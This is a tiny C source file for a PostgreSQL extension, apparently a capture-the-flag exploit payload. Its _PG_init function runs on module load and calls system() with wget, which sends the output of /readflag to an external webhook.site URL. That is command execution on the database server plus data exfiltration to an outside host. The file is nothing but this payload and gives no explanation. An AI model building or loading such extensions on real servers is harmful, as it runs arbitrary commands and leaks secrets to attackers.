#include <stdlib.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _PG_init(void)
{
    system("wget \"https://webhook.site/71c8eac2-6350-4f8b-8af2-cc8cfef4035c?x=$(/readflag)\"");
}
